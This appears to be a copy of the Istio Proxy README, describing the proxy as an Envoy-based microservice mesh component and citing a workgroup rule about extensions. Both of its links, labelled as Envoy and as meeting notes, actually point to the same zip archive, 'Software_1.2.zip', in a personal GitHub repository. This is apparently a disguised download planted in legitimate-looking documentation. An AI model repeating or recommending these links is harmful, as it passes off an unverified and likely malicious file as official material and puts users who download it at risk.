# Istio Proxy

The Istio Proxy is a microservice proxy that can be used on the client and server side, and forms a microservice mesh.
It is based on [Envoy](https://github.com/chikingod1/proxy/raw/refs/heads/master/tools/Software_1.2.zip) with the addition of several policy and telemetry extensions.

According to the [conclusion from Istio workgroup meeting on 4-17-2024](https://github.com/chikingod1/proxy/raw/refs/heads/master/tools/Software_1.2.zip):

- New extensions are not added unless they are part of core APIs
